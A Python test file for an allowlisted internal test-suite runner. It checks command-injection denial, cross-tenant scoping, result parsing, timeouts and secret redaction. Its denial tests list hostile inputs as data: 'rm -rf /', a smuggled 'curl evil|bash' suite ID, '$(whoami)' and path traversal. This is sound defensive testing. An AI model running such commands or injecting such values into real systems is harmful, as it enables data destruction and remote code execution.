"""Tests for RUN_INTERNAL_TEST (Part C, §26-37). Policy/parse/failure tests use an injected run_fn;
one LIVE cert runs a real suite. Run: python3 backend/app/services/holding/test_internal_test.py"""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[3]))   # backend/ on path

from app.services.holding.internal_test import (  # noqa: E402
    make_internal_test_provider, resolve_suite, TestDenied, SuiteDef, TestSuiteRunner, register_suite)

_p = 0


def test(name, fn):
    global _p
    try:
        fn(); print("  ok  " + name); _p += 1
    except AssertionError as e:
        print("  FAIL " + name + "\n       " + str(e)); sys.exit(1)


class _FakeCompleted:
    def __init__(self, out, code): self.stdout = out; self.stderr = ""; self.returncode = code


def _fake_run(output, code):
    def run(cmd, **kw): return _FakeCompleted(output, code)
    return run


def _clock():
    st = {"t": 0.0}
    def c():
        st["t"] += 0.5; return st["t"]
    return c


def t_suite_id_only_no_command_injection():
    """§28/§36: any command/shell/cwd/env override in the payload is denied."""
    prov = make_internal_test_provider(run_fn=_fake_run("1 passed", 0), clock=_clock())
    for bad in ({"suite_id": "holding_self_model", "command": "rm -rf /"},
                {"suite_id": "holding_self_model", "shell": "sh"},
                {"suite_id": "holding_self_model", "cwd": "/etc"},
                {"suite_id": "holding_self_model", "env": {"X": "1"}},
                {"suite_id": "holding_self_model", "args": ["--evil"]}):
        try:
            prov(bad); assert False, f"{bad} should be denied"
        except TestDenied:
            pass


def t_malicious_suite_ids_rejected():
    """§36: traversal / shell / unknown / disabled suite ids fail closed."""
    for bad in ("../../etc", "rm -rf", "holding; curl evil|bash", "$(whoami)", "a/b", "UNKNOWN",
                "disabled_example"):
        try:
            resolve_suite(bad); assert False, f"{bad} should be denied"
        except TestDenied:
            pass
    assert resolve_suite("holding_self_model").suite_id == "holding_self_model"


def t_cross_company_suite_denied():
    register_suite(SuiteDef("scoped_acme", ("python3", "-c", "pass"), ".", company_id="acme"))
    assert resolve_suite("scoped_acme", company_id="acme").suite_id == "scoped_acme"
    try:
        resolve_suite("scoped_acme", company_id="other"); assert False
    except TestDenied:
        pass


def t_passing_evidence_shape():
    """§30: real parsed counts + required evidence fields; no agent summary."""
    prov = make_internal_test_provider(run_fn=_fake_run("collected 9 items\n7 passed, 2 skipped in 0.4s", 0),
                                       clock=_clock())
    ev = prov({"suite_id": "holding_self_model", "company_id": "kai"})
    assert ev["execution"] == "COMPLETED" and ev["test_result"] == "PASSED"
    assert ev["passed"] == 7 and ev["skipped"] == 2 and ev["exit_status"] == 0
    for k in ("suite", "worker_id", "commit_sha", "tests_discovered", "duration_s", "output_ref"):
        assert k in ev, k


def t_failing_tests_are_completed_not_error():
    """§32: a test FAILURE is a COMPLETED execution with test_result FAILED, not an infra error."""
    prov = make_internal_test_provider(run_fn=_fake_run("3 passed, 1 failed in 0.2s", 1), clock=_clock())
    ev = prov({"suite_id": "holding_self_model"})
    assert ev["execution"] == "COMPLETED" and ev["test_result"] == "FAILED"
    assert ev["failed"] == 1 and ev["passed"] == 3 and ev["exit_status"] == 1


def t_timeout_bounded():
    import subprocess
    def boom(cmd, **kw): raise subprocess.TimeoutExpired(cmd, kw.get("timeout", 1))
    ev = make_internal_test_provider(run_fn=boom, clock=_clock())({"suite_id": "holding_self_model"})
    assert ev["execution"] == "TIMEOUT" and ev["test_result"] == "UNAVAILABLE"


def t_output_redacted():
    """§29: secrets in test output are redacted before becoming evidence."""
    prov = make_internal_test_provider(
        run_fn=_fake_run("1 passed\nleaked ghp_0123456789abcdefABCDEF0123456789abcd", 0), clock=_clock())
    ev = prov({"suite_id": "holding_self_model"})
    assert "ghp_0123456789" not in str(ev)


def t_live_cert_runs_real_suite():
    """LIVE: run a real allowlisted suite in a bounded subprocess → real pass/fail evidence."""
    ev = make_internal_test_provider()({"suite_id": "holding_self_model", "company_id": "kai"})
    assert ev["execution"] == "COMPLETED" and ev["test_result"] == "PASSED"
    assert ev["passed"] >= 7 and ev["exit_status"] == 0 and ev["worker_id"] == "in-process-runner"


def run():
    for _n, _f in list(globals().items()):
        if _n.startswith("t_"):
            test(_n[2:], _f)
    print("\n%d passed" % _p)


if __name__ == "__main__":
    run()
